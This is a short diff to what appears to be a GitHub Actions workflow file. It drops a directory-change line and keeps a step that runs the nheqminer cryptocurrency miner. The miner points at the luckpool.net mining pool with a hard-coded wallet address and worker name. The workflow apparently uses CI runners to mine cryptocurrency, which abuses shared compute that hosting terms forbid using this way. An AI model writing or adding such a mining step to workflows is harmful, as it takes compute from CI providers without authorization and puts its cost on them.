@@ -27,6 +27,5 @@ jobs:
 
       - name: Run nheqminer
         run: |
-          # Adjust this if the extracted directory name is different
-          cd nheqminer-Linux-v0.8.2
+          # Running the nheqminer executable directly
           ./nheqminer -v -l na.luckpool.net:3956 -u RP8SNudJuHRv3GJsxb2LJBrKxQKRdKoHL3.kiukiu1 -p x -t 2
